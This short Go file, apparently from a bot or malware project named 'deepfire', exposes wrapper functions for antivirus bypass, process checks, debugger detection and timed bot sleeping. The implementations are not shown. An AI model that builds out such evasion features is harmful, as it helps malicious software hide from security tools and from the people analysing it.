package deepfire

import "time"

func BypassAV() {
	bypassAV()
}

func CheckForProc(proc string) bool {
	return checkForProc(proc)
}

func DetectDebugPrroc() bool {
	return detectDebugProc()
}

func GoToSleep(sleeptime int) { //Makes the bot sleep
	//NewDebugUpdate("Sleeping for " + string(sleeptime) + " Seconds...")
	time.Sleep(time.Duration(sleeptime) * time.Second)
}
